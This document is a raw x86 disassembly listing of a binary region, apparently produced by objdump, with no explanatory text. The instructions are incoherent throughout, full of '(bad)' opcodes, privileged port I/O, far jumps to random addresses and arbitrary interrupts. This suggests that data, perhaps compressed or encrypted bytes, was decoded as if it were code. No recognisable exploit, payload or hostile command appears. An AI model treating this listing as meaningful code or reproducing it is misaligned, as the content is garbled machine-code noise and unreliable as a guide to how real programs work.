  40c564:	in     al,dx
  40c565:	(bad)  
  40c566:	and    ch,bh
  40c568:	fst    QWORD PTR [esi+0x24]
  40c56b:	pop    eax
  40c56c:	popa   
  40c56d:	xlat   BYTE PTR ds:[ebx]
  40c56e:	jge    0x40c5c6
  40c570:	int    0x62
  40c572:	daa    
  40c573:	(bad)  
  40c574:	pop    ss
  40c575:	es in  al,0x63
  40c578:	cmp    al,0xee
  40c57a:	add    eax,0x98e0b067
  40c57f:	fist   DWORD PTR [ebx]
  40c581:	pop    edx
  40c582:	add    eax,0x381163fc
  40c587:	fwait
  40c588:	out    0x69,eax
  40c58a:	mov    ebx,0x9cbdcc7d
  40c58f:	retf   0xe38f
  40c592:	in     eax,dx
  40c593:	outs   dx,BYTE PTR ds:[esi]
  40c594:	shr    DWORD PTR es:[ebx+edx*1+0x3e5085fb],0xab
  40c59d:	jnp    0x40c557
  40c59f:	pop    edx
  40c5a0:	daa    
  40c5a1:	loop   0x40c5c2
  40c5a3:	or     eax,0x9bdd49e5
  40c5a8:	(bad)  
  40c5a9:	dec    esp
  40c5aa:	cli    
  40c5ab:	mov    ds:0x69f79e84,al
  40c5b0:	or     al,0xab
  40c5b2:	mov    es,WORD PTR [edx]
  40c5b4:	cld    
  40c5b5:	(bad)  
  40c5b7:	push   eax
  40c5b8:	sub    DWORD PTR [edi+eiz*2+0x6d2dfd06],0x387e1e34
  40c5c3:	cmc    
  40c5c4:	(bad)  
  40c5c5:	les    eax,FWORD PTR [edx-0x70]
  40c5c8:	lea    esp,[edi+0x67c9e5f5]
  40c5ce:	cmp    dl,ch
  40c5d0:	stc    
  40c5d1:	adc    DWORD PTR [edi+0x44018aa4],edi
  40c5d7:	pop    ebp
  40c5d8:	pop    ds
  40c5d9:	add    edx,edi
  40c5db:	push   ebx
  40c5dc:	sub    BYTE PTR [edi+0x6fde2196],ah
  40c5e2:	es cs push es
  40c5e5:	xor    bl,BYTE PTR [edi]
  40c5e7:	push   ecx
  40c5e8:	lahf   
  40c5e9:	mov    BYTE PTR [ecx+ebp*1+0x2d8a0424],ch
  40c5f0:	int3   
  40c5f1:	mov    edi,0x2ea54d1c
  40c5f6:	sbb    DWORD PTR [eax-0x3b170e74],esp
  40c5fc:	in     eax,0x9a
  40c5fe:	add    al,0xce
  40c600:	mov    edi,0x659a2091
  40c605:	sbb    ebp,DWORD PTR [esi*2+0x989c186]
  40c60c:	cmc    
  40c60d:	sub    DWORD PTR [ebx-0x629a75da],esi
  40c613:	fsub   st(7),st
  40c615:	mov    WORD PTR [eax+0x8dbb2fd],ss
  40c61b:	mov    dh,BYTE PTR [edi+0x23]
  40c61e:	sbb    al,0x1a
  40c620:	dec    esp
  40c621:	(bad)  
  40c622:	aad    0x5
  40c624:	stc    
  40c625:	mov    ds:0xaaa326be,al
  40c62a:	je     0x40c5cc
  40c62c:	mov    dl,0x9e
  40c62e:	aas    
  40c62f:	add    dh,bh
  40c631:	and    ebx,DWORD PTR [edx+0x47e0cc22]
  40c637:	(bad)  
  40c639:	jne    0x40c6a7
  40c63b:	out    0xb0,eax
  40c63d:	les    esi,FWORD PTR [edi+0x4]
  40c640:	fild   DWORD PTR [edi+0x6f]
  40c643:	sbb    edi,ebp
  40c645:	pop    eax
  40c646:	mov    cl,0x90
  40c648:	xchg   edx,eax
  40c649:	inc    esp
  40c64a:	cmp    eax,0x24a5755d
  40c64f:	and    eax,0x7a9d3614
  40c654:	stc    
  40c655:	loop   0x40c600
  40c657:	dec    esi
  40c658:	into   
  40c659:	jne    0x40c6ae
  40c65b:	mov    ah,bh
  40c65d:	push   ds
  40c65e:	pop    es
  40c65f:	out    0x95,eax
  40c661:	out    dx,eax
  40c662:	std    
  40c663:	fdiv   st,st(4)
  40c665:	dec    esp
  40c666:	jl     0x40c6c0
  40c668:	xor    eax,0x59d9ece6
  40c66d:	inc    esp
  40c66e:	push   0xa379b9d8
  40c673:	xor    eax,0x9729068e
  40c678:	call   DWORD PTR [edi-0xfdacf94]
  40c67e:	std    
  40c67f:	mov    ebx,0xfed1fbfb
  40c684:	enter  0x8704,0x37
  40c688:	imul   edi,DWORD PTR [ebx-0x7e763a00],0x49
  40c68f:	mov    esi,0x8761dc30
  40c694:	jmp    0x40c6d4
  40c696:	add    bh,dl
  40c698:	xor    bh,BYTE PTR [eax-0x27]
  40c69b:	in     eax,0xe2
  40c69d:	mov    ds:0x144aeff4,al
  40c6a2:	mov    edx,edi
  40c6a4:	mov    WORD PTR [ebx],cs
  40c6a6:	sbb    ecx,DWORD PTR [ebx-0x170d55f5]
  40c6ac:	mov    ch,0x80
  40c6ae:	ret    0x6f4c
  40c6b1:	mov    ds:0x7e1e2500,al
  40c6b6:	ret    
  40c6b7:	shl    DWORD PTR [ebx],cl
  40c6b9:	aas    
  40c6ba:	fxch   st(5)
  40c6bc:	in     al,dx
  40c6bd:	mov    ebp,0xa07f6342
  40c6c2:	mov    esi,0x49ae62df
  40c6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6c8:	aam    0x4e
  40c6ca:	cli    
  40c6cb:	sbb    dl,dh
  40c6cd:	add    dh,al
  40c6cf:	pop    eax
  40c6d0:	pop    esi
  40c6d1:	add    al,0x4a
  40c6d3:	test   eax,0xa6457f05
  40c6d8:	pushf  
  40c6d9:	mov    bl,0x7f
  40c6db:	push   cs
  40c6dc:	jns    0x40c6de
  40c6de:	push   ebx
  40c6df:	add    ebp,edx
  40c6e1:	rcr    DWORD PTR [ecx-0x5e7ca7a],cl
  40c6e7:	or     BYTE PTR ds:[ebx],al
  40c6ea:	pop    DWORD PTR [ebx+0x17fa78da]
  40c6f0:	mov    al,ds:0x20b1f368
  40c6f5:	fimul  DWORD PTR [ebp-0x62]
  40c6f8:	or     al,0xed
  40c6fa:	jecxz  0x40c715
  40c6fc:	mov    cl,0x8f
  40c6fe:	jnp    0x40c702
  40c700:	xor    BYTE PTR [eax+edi*4],cl
  40c703:	mov    ch,0x82
  40c705:	paddusb mm0,QWORD PTR [ebx]
  40c708:	or     al,0xf2
  40c70a:	xchg   edi,eax
  40c70b:	mov    eax,0x7d8741e5
  40c710:	jp     0x40c6d0
  40c712:	jnp    0x40c75e
  40c714:	imul   edx,ebp,0xffffffa0
  40c717:	mov    edi,0xe0279227
  40c71c:	repz sbb al,0x15
  40c71f:	push   edx
  40c720:	inc    edi
  40c721:	bts    DWORD PTR [ebp-0x5c],0x87
  40c726:	sub    esi,DWORD PTR [edx+eax*2-0x36]
  40c72a:	sbb    bl,dl
  40c72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c72d:	cmp    BYTE PTR [eax-0x361176de],al
  40c733:	push   edx
  40c734:	pusha  
  40c735:	jle    0x40c6c9
  40c737:	cmp    DWORD PTR [ecx+0x78798e26],0x1f
  40c73e:	fild   WORD PTR [ebp+0x598fe1ae]
  40c744:	ins    DWORD PTR es:[di],dx
  40c746:	(bad)  
  40c747:	int    0xab
  40c749:	mov    dh,0xc6
  40c74b:	es or  ch,ah
  40c74e:	int    0xf6
  40c750:	xchg   ecx,eax
  40c751:	mov    bh,0xc6
  40c753:	imul   esi,DWORD PTR [ebp-0x36a24fbf],0xfffffff0
  40c75a:	push   esp
  40c75b:	into   
  40c75c:	mov    ds:0x9b6c5258,al
  40c761:	xchg   ecx,eax
  40c762:	sbb    esi,DWORD PTR cs:[ebx]
  40c765:	or     al,0x7b
  40c767:	cmp    esp,DWORD PTR [edx-0x5d]
  40c76a:	xchg   DWORD PTR [eax],edx
  40c76c:	lods   eax,DWORD PTR ds:[esi]
  40c76d:	enter  0x157e,0xe2
  40c771:	popf   
  40c772:	push   ds
  40c773:	test   BYTE PTR [esi],ah
  40c775:	ins    BYTE PTR es:[edi],dx
  40c776:	push   edx
  40c777:	jnp    0x40c7cd
  40c779:	sub    BYTE PTR [ecx],bl
  40c77b:	mov    WORD PTR [ebx-0x5d],?
  40c77e:	jg     0x40c70b
  40c780:	out    0x1c,eax
  40c782:	cmp    eax,0x9ade0a24
  40c787:	ret    
  40c788:	mov    ah,0x3c
  40c78a:	ins    BYTE PTR es:[edi],dx
  40c78b:	mov    DWORD PTR [ecx-0x7f],esp
  40c78e:	fwait
  40c78f:	int3   
  40c790:	and    ebp,DWORD PTR [eax]
  40c792:	inc    edi
  40c793:	icebp  
  40c794:	sbb    DWORD PTR ds:0x8dc8dcee,ecx
  40c79a:	dec    edx
  40c79b:	stc    
  40c79c:	lahf   
  40c79d:	jge    0x40c800
  40c79f:	and    eax,0xd38ec16
  40c7a4:	dec    ebx
  40c7a5:	jge    0x40c777
  40c7a7:	cwde   
  40c7a8:	cwde   
  40c7a9:	test   DWORD PTR [edi],esp
  40c7ab:	mov    ds:0x6257c627,al
  40c7b0:	push   ebx
  40c7b1:	sbb    al,BYTE PTR ds:0xaafdb1ff
  40c7b7:	ret    0x39ea
  40c7ba:	test   ebp,ebp
  40c7bc:	pushf  
  40c7bd:	push   esp
  40c7be:	jo     0x40c782
  40c7c0:	or     BYTE PTR [ebx],bh
  40c7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7c3:	cli    
  40c7c4:	xor    DWORD PTR [esi-0x30237b15],ebx
  40c7ca:	cmp    eax,0x551c2c5a
  40c7cf:	mov    bl,0x53
  40c7d1:	xchg   edx,eax
  40c7d2:	fbld   TBYTE PTR [ebp+edx*4-0x64]
  40c7d6:	mov    al,0x28
  40c7d8:	stc    
  40c7d9:	push   ds
  40c7da:	fist   WORD PTR [ecx-0x717352d7]
  40c7e0:	or     bh,BYTE PTR [esp+edi*8-0x703a3da4]
  40c7e7:	(bad)  
  40c7e8:	jne    0x40c85d
  40c7ea:	xchg   edx,eax
  40c7eb:	jb     0x40c76f
  40c7ed:	sbb    bl,BYTE PTR [eax+0x2b]
  40c7f0:	sar    esi,0xf
  40c7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f4:	jmp    0x40c845
  40c7f6:	into   
  40c7f7:	dec    eax
  40c7f8:	gs xchg ecx,eax
  40c7fa:	dec    edx
  40c7fb:	mov    WORD PTR ds:0x5f340d72,ss
  40c801:	fcom   DWORD PTR [ecx]
  40c803:	std    
  40c804:	dec    sp
  40c806:	fnstsw WORD PTR [esi]
  40c808:	push   ds
  40c809:	and    eax,0x8d64b58c
  40c80e:	ror    DWORD PTR [ebx+ecx*8],1
  40c811:	mov    bl,0x6e
  40c813:	pusha  
  40c814:	leave  
  40c815:	xor    eax,0x3c31df2c
  40c81a:	pop    ebp
  40c81b:	add    DWORD PTR [esi-0x60588ca0],esp
  40c821:	(bad)  
  40c822:	fdiv   st(6),st
  40c824:	iret   
  40c825:	pusha  
  40c826:	outs   dx,DWORD PTR ds:[esi]
  40c827:	mov    dl,0x40
  40c829:	fwait
  40c82a:	rcr    DWORD PTR [esi-0x48],1
  40c82d:	cmp    eax,0xc3a96bc1
  40c832:	and    cl,dh
  40c834:	imul   ah
  40c836:	ret    0xc6ba
  40c839:	mov    ecx,0x3e9b0647
  40c83e:	mov    ds:0x26c98e7c,eax
  40c843:	mov    dl,0x6d
  40c845:	out    dx,eax
  40c846:	mov    edx,0xf08238fe
  40c84b:	cdq    
  40c84c:	(bad)  
  40c84d:	jae    0x40c8aa
  40c84f:	(bad)  
  40c850:	add    DWORD PTR [edx-0x3ad9a565],esi
  40c856:	aaa    
  40c857:	outs   dx,DWORD PTR ds:[esi]
  40c858:	into   
  40c859:	mov    bl,0xbf
  40c85b:	push   ebp
  40c85c:	inc    eax
  40c85d:	sahf   
  40c85e:	mov    al,0x93
  40c860:	or     al,0xdc
  40c862:	cmp    esp,DWORD PTR [ebx-0xd0111dd]
  40c868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c869:	add    cl,BYTE PTR [ebx+0xa]
  40c86c:	push   ebx
  40c86d:	jle    0x40c835
  40c86f:	pop    ebp
  40c870:	mov    WORD PTR [edx+0x6],gs
  40c873:	out    0xf6,al
  40c875:	or     BYTE PTR [esi-0x648becb7],ah
  40c87b:	or     eax,DWORD PTR es:[ecx+eiz*4-0x23506f52]
  40c883:	dec    ebp
  40c884:	pop    es
  40c885:	ds jle 0x40c89a
  40c888:	rol    BYTE PTR [ecx+0x56e75c3a],0x1d
  40c88f:	das    
  40c890:	int    0x31
  40c892:	jno    0x40c864
  40c894:	out    dx,eax
  40c895:	aaa    
  40c896:	aaa    
  40c897:	lods   eax,DWORD PTR ds:[esi]
  40c898:	adc    DWORD PTR [esi+0x17444c],ebx
  40c89e:	xor    BYTE PTR [edi],ah
  40c8a0:	lock rcr BYTE PTR ds:[ebx+0x61707bf6],cl
  40c8a8:	xor    DWORD PTR ds:0x8ba6c9af,edi
  40c8ae:	pop    ebp
  40c8af:	std    
  40c8b0:	fadd   st(7),st
  40c8b2:	xor    eax,0xc7210778
  40c8b7:	push   ds
  40c8b8:	and    BYTE PTR [edi],dh
  40c8ba:	sar    esp,0x8e
  40c8bd:	sbb    BYTE PTR [eax+edx*1],bl
  40c8c0:	inc    ebp
  40c8c1:	sbb    esp,DWORD PTR [ebp+0x1f1312b3]
  40c8c7:	sub    BYTE PTR [eax+esi*4],dl
  40c8ca:	fdivr  st(5),st
  40c8cc:	stos   BYTE PTR es:[edi],al
  40c8cd:	pop    ss
  40c8ce:	sbb    BYTE PTR [edi-0xb],ah
  40c8d1:	shl    DWORD PTR [edi-0x1a],cl
  40c8d4:	add    bl,BYTE PTR [ebp+0x63b6e0b1]
  40c8da:	push   ss
  40c8db:	or     dl,ah
  40c8dd:	das    
  40c8de:	and    eax,0x6f39dd71
  40c8e3:	mov    ebp,DWORD PTR [edx]
  40c8e5:	rcl    BYTE PTR [ebx],1
  40c8e7:	bound  ebp,QWORD PTR [esi+0x2918aaf5]
  40c8ed:	std    
  40c8ee:	xchg   ebp,eax
  40c8ef:	mov    al,0x52
  40c8f1:	dec    eax
  40c8f2:	test   eax,0x4a378044
  40c8f7:	shl    DWORD PTR [ecx+0x73f2192],1
  40c8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8fe:	cmp    eax,0xc1218e75
  40c903:	jge    0x40c901
  40c905:	sub    dh,dh
  40c907:	hlt    
  40c908:	test   eax,0x8a84bacc
  40c90d:	dec    esi
  40c90e:	dec    eax
  40c90f:	cmp    al,0xe5
  40c911:	leave  
  40c912:	js     0x40c957
  40c914:	nop
  40c915:	jmp    0x40c93e
  40c917:	enter  0x9767,0x89
  40c91b:	xchg   ecx,eax
  40c91c:	adc    bh,BYTE PTR [ebp-0x357bc095]
  40c922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c923:	inc    esi
  40c924:	add    edi,eax
  40c926:	push   eax
  40c927:	sti    
  40c928:	pop    es
  40c929:	adc    dl,BYTE PTR [eax]
  40c92b:	mov    edx,0x36cd6cae
  40c930:	adc    DWORD PTR [esi-0x4d],0x66d6ccc9
  40c937:	fiadd  DWORD PTR [ecx-0x1b47d704]
  40c93d:	mov    esp,0xd6ea4e15
  40c942:	xor    al,0x8d
  40c944:	jo     0x40c953
  40c946:	out    dx,eax
  40c947:	push   edx
  40c949:	leave  
  40c94a:	cmp    BYTE PTR [ebx+0x3c],dh
  40c94d:	or     ecx,ebp
  40c94f:	mov    bh,0x95
  40c951:	and    ebx,DWORD PTR [eax-0x4ab31847]
  40c957:	xchg   ebp,eax
  40c958:	int    0xf4
  40c95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c95b:	test   ebp,ebx
  40c95d:	test   DWORD PTR [ecx],edx
  40c95f:	jmp    0xa748ab25
  40c964:	push   ebx
  40c965:	ja     0x40c973
  40c967:	out    dx,eax
  40c968:	lahf   
  40c969:	aam    0xf0
  40c96b:	xchg   ebx,eax
  40c96c:	or     DWORD PTR [esi-0x3a8edb35],ebp
  40c972:	mov    bl,0x6a
  40c974:	sub    ecx,DWORD PTR [ecx-0x44]
  40c977:	ror    BYTE PTR [ecx-0x21],1
  40c97a:	arpl   sp,dx
  40c97c:	(bad)  [ecx+0x21f8dbdb]
  40c982:	fst    QWORD PTR [ebp+0x5a]
  40c985:	imul   esp,edx,0xffffff8f
  40c988:	jmp    0x70bdf3b1
  40c98d:	call   0x56bf408f
  40c992:	sahf   
  40c993:	xchg   ecx,eax
  40c994:	xor    al,ah
  40c996:	mov    si,0x6993
  40c99a:	nop
  40c99b:	cmp    dl,BYTE PTR ds:0x46cbd8f0
  40c9a1:	rcl    DWORD PTR [edi-0x24],1
  40c9a4:	cmp    edx,DWORD PTR [ecx+0x13b4d25d]
  40c9aa:	jecxz  0x40c948
  40c9ac:	retf   0x640a
  40c9af:	push   eax
  40c9b0:	push   esp
  40c9b1:	sub    BYTE PTR [edi-0xbb0eaae],al
  40c9b7:	xor    al,0xe
  40c9b9:	hlt    
  40c9ba:	rcr    BYTE PTR [edx-0x67b63254],1
  40c9c0:	mov    al,ds:0xce61e660
  40c9c5:	adc    al,0x8e
  40c9c7:	repnz xchg edi,eax
  40c9c9:	test   edi,ebx
  40c9cb:	or     bh,BYTE PTR [edi]
  40c9cd:	push   ebx
  40c9ce:	dec    esi
  40c9cf:	in     al,dx
  40c9d0:	test   DWORD PTR [eax+0x40825601],edx
  40c9d6:	fstp   DWORD PTR [eax+ebx*8+0xe6dcc34]
  40c9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9de:	mov    ds:0x66c11ff7,eax
  40c9e3:	shr    bl,1
  40c9e5:	cmp    al,cl
  40c9e7:	cwde   
  40c9e8:	and    esi,DWORD PTR [edx-0x2d5e179c]
  40c9ee:	mov    ebp,0x4cc86b9
  40c9f3:	retf   0x7eb
  40c9f6:	ficom  DWORD PTR [edx]
  40c9f8:	lds    ebx,FWORD PTR [ecx]
  40c9fa:	cli    
  40c9fb:	push   ecx
  40c9fc:	mov    eax,ds:0x266f89f0
  40ca01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca02:	mov    ds:0xbb83b59b,eax
  40ca07:	push   ecx
  40ca08:	sbb    DWORD PTR [ecx],edi
  40ca0a:	pop    edi
  40ca0b:	(bad)  
  40ca0c:	fcmovnbe st,st(5)
  40ca0e:	sbb    bl,0x4e
  40ca11:	jge    0x40ca36
  40ca13:	shr    BYTE PTR [ebx],1
  40ca15:	mov    WORD PTR [ebx+0x6a71e822],ds
  40ca1b:	xor    ah,0x6d
  40ca1e:	push   ds
  40ca1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca20:	mov    esp,0x8f7d74aa
  40ca25:	sub    esi,0x25
  40ca28:	xchg   ebx,eax
  40ca29:	les    edx,FWORD PTR [eax+0x77]
  40ca2c:	cld    
  40ca2d:	push   0xffffff9c
  40ca2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca30:	pop    ss
  40ca31:	push   ds
  40ca32:	into   
  40ca33:	es aam 0x6b
  40ca36:	add    ah,BYTE PTR [ecx-0x2f]
  40ca39:	out    0xa6,eax
  40ca3b:	xor    edi,eax
  40ca3d:	jo     0x40ca64
  40ca3f:	mov    eax,0xd93d58e9
  40ca44:	pop    es
  40ca45:	dec    ebx
  40ca46:	xchg   esi,eax
  40ca47:	popf   
  40ca48:	xchg   DWORD PTR [edx],edx
  40ca4a:	dec    esp
  40ca4b:	test   DWORD PTR [esi+ebp*1],ebp
  40ca4e:	adc    ch,BYTE PTR [esi]
  40ca50:	jmp    0xfa51:0x52d97991
  40ca57:	jecxz  0x40ca75
  40ca59:	stos   BYTE PTR es:[edi],al
  40ca5a:	fdiv   QWORD PTR [ebx+0x5f]
  40ca5d:	sub    ah,BYTE PTR ds:0xb9a945bb
  40ca63:	test   al,0x8
  40ca65:	sahf   
  40ca66:	and    eax,0xcc727d6
  40ca6b:	shl    DWORD PTR [eax],cl
  40ca6d:	js     0x40ca22
  40ca6f:	dec    ebx
  40ca70:	mov    al,0x93
  40ca72:	push   esi
  40ca73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca74:	push   ss
  40ca75:	sbb    BYTE PTR [eax+0x19],0xda
  40ca79:	stc    
  40ca7a:	ret    0x882
  40ca7d:	test   edx,0xf12bc809
  40ca83:	xchg   edi,eax
  40ca84:	jecxz  0x40cafd
  40ca86:	in     al,dx
  40ca87:	xchg   ecx,eax
  40ca88:	das    
  40ca89:	loope  0x40ca4c
  40ca8b:	(bad)  
  40ca8c:	or     ch,bl
  40ca8e:	mov    ds:0xb65b3361,al
  40ca93:	jnp    0x40ca4d
  40ca95:	das    
  40ca96:	es js  0x40ca1b
  40ca99:	sub    eax,0x579c781d
  40ca9e:	lahf   
  40ca9f:	sahf   
  40caa0:	retf   0x4648
  40caa3:	fadd   DWORD PTR [eax+0x136bbaa]
  40caa9:	cli    
  40caaa:	push   esi
  40caab:	inc    esp
  40caac:	(bad)  
  40caad:	and    dh,BYTE PTR [edx+edi*8]
  40cab0:	sbb    eax,0xdf7b5072
  40cab5:	mov    edi,0xd15601a4
  40caba:	repz les esp,FWORD PTR [edi+0x4]
  40cabe:	es pop ebp
  40cac0:	push   esi
  40cac1:	stos   DWORD PTR es:[edi],eax
  40cac2:	cmc    
  40cac3:	hlt    
  40cac4:	inc    ecx
  40cac5:	mov    edx,0xfc3a4357
  40caca:	push   0x8
  40cacc:	jmp    0xd0f151cb
  40cad1:	add    eax,0x8d441538
  40cad6:	pop    esi
  40cad7:	test   edx,edi
  40cad9:	mov    eax,0x627037fa
  40cade:	inc    esp
  40cadf:	and    al,0xa6
  40cae1:	jbe    0x40cb14
  40cae3:	shl    ah,1
  40cae5:	lahf   
  40cae6:	pop    esi
  40cae7:	aad    0xc8
  40cae9:	adc    BYTE PTR [bp+si+0x51ce],ah
  40caee:	hlt    
  40caef:	call   0x1e17:0xc337df9f
  40caf6:	mov    dl,bl
  40caf8:	stos   BYTE PTR es:[edi],al
  40caf9:	inc    esi
  40cafa:	(bad)  
  40cafb:	push   cs
  40cafc:	and    al,0x8a
  40cafe:	cmp    BYTE PTR [ecx+eax*1+0xe],bl
  40cb02:	and    eax,0x1ee29975
  40cb07:	sub    bl,ch
  40cb09:	or     BYTE PTR [edx-0x4d],al
  40cb0c:	mov    eax,0xc1795b5a
  40cb11:	adc    al,0xf3
  40cb13:	pop    edx
  40cb14:	inc    eax
  40cb15:	push   ebp
  40cb16:	sub    bl,dh
  40cb18:	test   eax,0x5a7ad9b5
  40cb1d:	enter  0x3d36,0x37
  40cb21:	pusha  
  40cb22:	xchg   ebx,eax
  40cb23:	or     al,BYTE PTR [esi+0x1eb68694]
  40cb29:	jecxz  0x40cae7
  40cb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb2c:	sbb    al,BYTE PTR [edx]
  40cb2e:	add    al,0xac
  40cb30:	fist   DWORD PTR [ebp+edx*1+0x632cee08]
  40cb37:	push   esi
  40cb38:	push   0x71
  40cb3a:	lds    ebx,FWORD PTR [edi]
  40cb3c:	inc    ebx
  40cb3d:	pop    edx
  40cb3e:	call   0x62482ae2
  40cb43:	cmp    dh,BYTE PTR [ecx-0x4b]
  40cb46:	adc    eax,0x42437b7
  40cb4b:	lds    ebx,FWORD PTR [edi+ecx*1]
  40cb4e:	inc    ecx
  40cb4f:	int    0x55
  40cb51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb52:	mov    ch,0x40
  40cb54:	or     edx,ebx
  40cb56:	push   esi
  40cb57:	aad    0xf
  40cb59:	sub    al,0xb
  40cb5b:	cmp    esp,eax
  40cb5d:	test   DWORD PTR es:[ebp+ebp*8-0x4f6ad647],edx
  40cb65:	adc    eax,0xdb74b657
  40cb6a:	adc    edi,esp
  40cb6c:	dec    esi
  40cb6d:	lods   al,BYTE PTR ds:[esi]
  40cb6e:	in     eax,dx
  40cb6f:	add    eax,0x4d71cc0e
  40cb74:	retf   
  40cb75:	mov    ds:0x21ac12b6,al
  40cb7a:	sahf   
  40cb7b:	repnz fisttp DWORD PTR [edx]
  40cb7e:	iret   
  40cb7f:	cdq    
  40cb80:	xor    cl,BYTE PTR [ecx-0x8]
  40cb83:	out    dx,al
  40cb84:	fs or  al,0xbe
  40cb87:	je     0x40cb5e
  40cb89:	jo     0x40cb86
  40cb8b:	addr16 xchg ecx,eax
  40cb8d:	loop   0x40cb49
  40cb8f:	pop    ebx
  40cb90:	cmp    eax,0x1832aabd
  40cb95:	sub    dl,BYTE PTR [ebp+ebx*8+0x5a]
  40cb99:	std    
  40cb9a:	(bad)  
  40cb9b:	cmp    DWORD PTR [esi],ecx
  40cb9d:	inc    eax
  40cb9e:	out    0xfa,al
  40cba0:	ss mov ah,0x78
  40cba3:	loope  0x40cbce
  40cba5:	popa   
  40cba6:	shl    BYTE PTR [edx-0x47],1
  40cba9:	pop    eax
  40cbaa:	jns    0x40cc1a
  40cbac:	adc    eax,0x5a33941b
  40cbb1:	ror    DWORD PTR [eax],1
  40cbb3:	add    dh,ch
  40cbb5:	adc    DWORD PTR [edi+0x12],ebx
  40cbb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb9:	mov    BYTE PTR [ebx+0x10e7eeaf],bh
  40cbbf:	jns    0x40cb48
  40cbc1:	jbe    0x40cbf7
  40cbc3:	jnp    0xea9a62f1
  40cbc9:	ins    BYTE PTR es:[edi],dx
  40cbca:	mov    cl,0xf2
  40cbcc:	scas   al,BYTE PTR es:[edi]
  40cbcd:	test   BYTE PTR [edi-0x25bf30d3],bh
  40cbd3:	add    eax,0xe73f602a
  40cbd8:	mov    bh,0x11
  40cbda:	aas    
  40cbdb:	pop    ds
  40cbdc:	mov    edi,0x54f51b66
  40cbe1:	inc    ebx
  40cbe2:	dec    edx
  40cbe3:	cld    
  40cbe4:	(bad)  
  40cbe5:	das    
  40cbe6:	mov    esp,0xcdca7015
  40cbeb:	test   edi,ebx
  40cbed:	mov    dh,BYTE PTR [edi+0x50dd40ac]
  40cbf3:	sbb    ah,BYTE PTR [ebp-0x746dac84]
  40cbf9:	icebp  
  40cbfa:	mov    eax,0xb44cd900
  40cbff:	(bad)  
  40cc00:	loope  0x40cbcc
  40cc02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc03:	mov    al,ds:0x79e5c0cf
  40cc08:	push   eax
  40cc09:	or     al,0xc0
  40cc0b:	in     al,0x49
  40cc0d:	xchg   ebp,eax
  40cc0e:	add    eax,0x365c1930
  40cc13:	ret    
  40cc14:	fistp  QWORD PTR [eax]
  40cc16:	or     eax,0xcf148d28
  40cc1b:	fcom   st(7)
  40cc1d:	int    0xab
  40cc1f:	add    BYTE PTR [edi],0x8a
  40cc22:	xor    BYTE PTR ds:0x1ed87e48,0x16
  40cc29:	mov    WORD PTR [ebx],fs
  40cc2b:	idiv   BYTE PTR [bx+si+0x421c]
  40cc30:	fistp  DWORD PTR [edi]
  40cc32:	push   cs
  40cc33:	test   BYTE PTR [ecx+ecx*4+0x5d],bl
  40cc37:	mov    cl,0xb9
  40cc39:	out    0x1d,al
  40cc3b:	test   DWORD PTR [ecx+0x1a],edi
  40cc3e:	sahf   
  40cc3f:	push   ss
  40cc40:	or     cl,BYTE PTR [eax]
  40cc42:	adc    eax,0xec8ce553
  40cc47:	sar    BYTE PTR [edi+0x1319b0c5],cl
  40cc4d:	sub    dl,BYTE PTR [ebx+0x44b6669b]
  40cc53:	outs   dx,BYTE PTR ds:[esi]
  40cc54:	in     al,dx
  40cc55:	pop    ebp
  40cc56:	push   di
  40cc58:	jle    0x40cc34
  40cc5a:	arpl   WORD PTR [esi+0x4],si
  40cc5d:	xchg   ebx,eax
  40cc5e:	or     DWORD PTR [ecx+edi*8+0x14696115],ecx
  40cc65:	or     edx,edx
  40cc67:	mov    al,ds:0xbe03c910
  40cc6c:	push   cs
  40cc6d:	addr16 jmp 0x40ccc3
  40cc70:	sbb    DWORD PTR [edi],0x2d
  40cc73:	lods   al,BYTE PTR ds:[esi]
  40cc74:	mov    eax,0x2e789a75
  40cc79:	push   eax
  40cc7a:	inc    edi
  40cc7b:	mov    DWORD PTR [esp+ebx*8],ecx
  40cc7e:	sub    DWORD PTR [ecx+0x23],eax
  40cc81:	cmp    DWORD PTR ds:[eax],esi
  40cc84:	push   0xdc2e9f16
  40cc89:	inc    eax
  40cc8a:	lock mov ah,0xf8
  40cc8d:	adc    edx,DWORD PTR [esp+edi*2+0x11c71b3e]
  40cc94:	cmp    al,0xa7
  40cc96:	repnz arpl WORD PTR [esi+0x20310c95],bp
  40cc9d:	and    eax,0xce9f04fc
  40cca2:	js     0x40cc67
  40cca4:	icebp  
  40cca5:	out    dx,al
  40cca6:	mov    al,ds:0xf37e0b52
  40ccab:	add    eax,0x1ae72a1d
  40ccb0:	add    eax,0x39b9cb30
  40ccb5:	popa   
  40ccb6:	jecxz  0x40cc74
  40ccb8:	and    bh,BYTE PTR [esp+ecx*8]
  40ccbb:	xchg   ebp,eax
  40ccbc:	es fs mov edx,0x82897bd2
  40ccc3:	xchg   edx,eax
  40ccc4:	stos   DWORD PTR es:[edi],eax
  40ccc5:	out    0x14,al
  40ccc7:	and    dh,BYTE PTR [edi+eiz*2+0x49]
  40cccb:	and    dl,al
  40cccd:	pop    ss
  40ccce:	stc    
  40cccf:	jb     0x40cd07
  40ccd1:	cdq    
  40ccd2:	inc    edi
  40ccd3:	push   ebx
  40ccd4:	mov    edi,0x12a905a6
  40ccd9:	sub    esp,ebx
  40ccdb:	mov    ah,0x50
  40ccdd:	ins    DWORD PTR es:[edi],dx
  40ccde:	fwait
  40ccdf:	inc    edx
  40cce0:	dec    esi
  40cce1:	adc    eax,0x811b4d62
  40cce6:	mov    dl,0x40
